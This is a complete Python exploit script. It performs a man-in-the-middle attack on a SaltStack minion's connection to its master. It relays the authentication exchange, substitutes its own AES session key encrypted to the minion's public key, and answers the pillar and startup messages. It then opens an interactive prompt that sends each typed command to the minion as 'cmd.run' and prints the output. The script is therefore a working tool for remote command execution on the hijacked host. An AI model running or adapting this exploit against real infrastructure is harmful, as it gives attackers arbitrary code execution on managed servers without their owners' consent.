#!/usr/bin/env python
import sys
import argparse
import tempfile
import urlparse
import random

import zmq
import msgpack
from M2Crypto import RSA

import salt.crypt


parser = argparse.ArgumentParser(description="MitM's a minion's connection to a salt-master")
parser.add_argument('--master', '-m', default='tcp://127.0.0.1:4506', help='A ZMQ-URL pointing to the real salt-master')
parser.add_argument('--address', '-a', default='tcp://127.0.0.1:4507', help='A ZMQ-URL to bind the socket to')
parser.add_argument('--pub-address', '-p', default='tcp://127.0.0.1:4508', help='A ZMQ-URL to bind the pub socket to')

log = lambda x: sys.stderr.write(x + "\n"); sys.stderr.flush()

def proxy(client_socket, msg):
    client_socket.send(msgpack.dumps(msg))
    return msgpack.loads(client_socket.recv())

def authenticate(args, server_socket, client_socket):
    # Get the _auth packet
    log('Waiting for an auth packet')
    auth_packet = msgpack.loads(server_socket.recv())

    # Parse the minion's public key
    log("Parsing the minion's public key")
    with tempfile.NamedTemporaryFile() as temp_pub_key:
        temp_pub_key.write(auth_packet['load']['pub'])
        temp_pub_key.flush()
        pub_key = RSA.load_pub_key(temp_pub_key.name)

    # Get the real response from the master
    log('Getting the decryption of the token from the legitimate master')
    master_response = proxy(client_socket, auth_packet)

    # Generate our own AES key and send it to the client
    log("Generating an AES key")
    aes_key = salt.crypt.Crypticle.generate_key_string()

    # Fudge some response parameters
    master_response['aes'] = pub_key.public_encrypt(aes_key, 4)
    master_response['publish_port'] = urlparse.urlparse(args.pub_address).port

    log('Sending the AES key to the minion')
    server_socket.send(msgpack.dumps(master_response))

    return aes_key, pub_key

def main(args):
    log('Initializing ZMQ')
    ctx = zmq.Context()

    # Initialize our server context
    server_socket = ctx.socket(zmq.REP)
    server_socket.bind(args.address)

    # Initialize a client to the real salt-master
    client_socket = ctx.socket(zmq.REQ)
    client_socket.connect(args.master)

    # Initialize our pub socket (for sending commands)
    pub_socket = ctx.socket(zmq.PUSH)
    pub_socket.bind(args.pub_address)

    log('Authenticating with the minion')
    aes_key, pub_key = authenticate(args, server_socket, client_socket)
    crypticle = salt.crypt.Crypticle({}, aes_key)

    log('Authenticating with the minion to send pillar info')
    pillar_aes_key, _ = authenticate(args, server_socket, client_socket)
    pillar_crypticle = salt.crypt.Crypticle({}, pillar_aes_key)

    log('Getting pillar info from the minion')
    pillar_crypticle.loads(msgpack.loads(server_socket.recv())['load'])
    server_socket.send(msgpack.dumps({
        'enc': 'aes',
        'key': pub_key.public_encrypt(pillar_aes_key, 4),
        'pillar': pillar_crypticle.dumps({}),
    }))

    log('Waiting for a "minion_start" event')
    crypticle.loads(msgpack.loads(server_socket.recv())['load'])

    # shhhhh, it'll all be over soon
    server_socket.send(msgpack.dumps({
        'enc': 'aes',
        'load': crypticle.dumps(True),
    }))

    log("Minion ready to obey")

    while True:
        # Prompt the user for a command
        command = raw_input('# ')

        # Send the command to the minion
        pub_socket.send(msgpack.dumps({
            'enc': 'aes',
            'load': crypticle.dumps({
                'tgt_type': 'glob',
                'jid': str(random.randint(0, 1000000000)),
                'tgt': '*',
                'ret': '',
                'user': 'sudo_ubuntu',
                'arg': [command],
                'fun': 'cmd.run',
            }),
        }))

        # Fetch the result
        result = crypticle.loads(msgpack.loads(server_socket.recv())['load'])
        print result['return']

        # Tell the minion we got the message
        server_socket.send(msgpack.dumps({
            'enc': 'aes',
            'load': crypticle.dumps(True),
        }))


if __name__ == '__main__':
    args = parser.parse_args()
    main(args)
